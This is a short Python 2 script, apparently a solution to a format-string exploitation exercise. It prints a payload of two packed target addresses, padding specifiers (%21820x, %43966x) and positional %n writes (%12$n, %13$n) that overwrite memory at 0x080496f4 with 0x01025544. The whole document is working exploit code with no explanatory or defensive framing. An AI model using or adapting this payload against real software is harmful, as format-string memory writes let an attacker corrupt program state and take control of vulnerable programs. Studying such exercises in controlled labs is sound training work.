import struct

# address of target
target1 = struct.pack("I", 0x080496f4)
# address of second half of target
target2 = struct.pack("I", 0x080496f4 + 2)

# offset to create value 0x5544
offset1 = "%21820x"
# offset to create value 0x10102 (simply 0x0102 when placed properly)
offset2 = "%43966x"

# write to target1 (above)
write1 = "%12$n"
# write to target2 (above)
write2 = "%13$n"

print target1 + target2 + offset1 + write1 + offset2 + write2
